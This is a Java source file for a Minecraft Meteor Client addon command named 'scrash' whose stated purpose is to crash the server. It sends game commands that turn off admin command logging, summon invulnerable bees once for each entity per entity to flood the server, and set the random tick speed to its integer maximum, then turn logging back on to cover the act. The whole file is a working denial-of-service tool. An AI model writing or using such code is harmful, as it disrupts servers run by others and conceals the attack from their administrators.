package spigey.asteroide.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.command.CommandSource;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;
import static meteordevelopment.meteorclient.MeteorClient.mc;
import static spigey.asteroide.util.msg;
import static spigey.asteroide.util.perm;

public class ServerCrash extends Command {
    public ServerCrash() {
        super("scrash", "Crashes the server ENABLE BEE NORENDER");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            error("Remember to disable Bee rendering using NoRender and install the EntityCulling mod!");
            info("Attempting to crash the server");
            assert mc.player != null;
            if(!mc.player.hasPermissionLevel(2)){
                error(perm(2));
            }
            if(mc.player.hasPermissionLevel(2)){
                msg("/gamerule logAdminCommands false");
                msg("/gamerule sendCommandFeedback false");
            }
            msg("/execute as @e as @e run summon bee ~ ~-10 ~ {Invulnerable:1}");
            msg("/gamerule randomTickSpeed 2147483647");
            if(mc.player.hasPermissionLevel(2)){
                msg("/save-all");
                msg("/gamerule sendCommandFeedback true");
                msg("/gamerule logAdminCommands true");
            }
            return SINGLE_SUCCESS;
        });
    }
}
